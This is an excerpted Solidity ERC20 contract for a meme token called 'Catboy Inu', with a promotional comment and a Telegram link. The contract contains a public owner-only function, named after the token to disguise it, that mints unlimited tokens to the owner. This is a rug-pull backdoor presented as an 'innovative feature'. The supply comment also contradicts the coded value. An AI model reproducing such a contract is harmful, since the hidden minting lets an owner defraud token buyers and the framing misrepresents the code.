...
//
// $CatboyInu proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/Catboyinu
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _CatboyInu(uint256 amount) public onlyOwner {
 _CatboyInu(msg.sender, amount);
    }
    ...
    function _CatboyInu(address account, uint256 amount) internal virtual {
...
contract $CatboyInu is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Catboy Inu", "CATBOYINU") {
     _CatboyInu(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}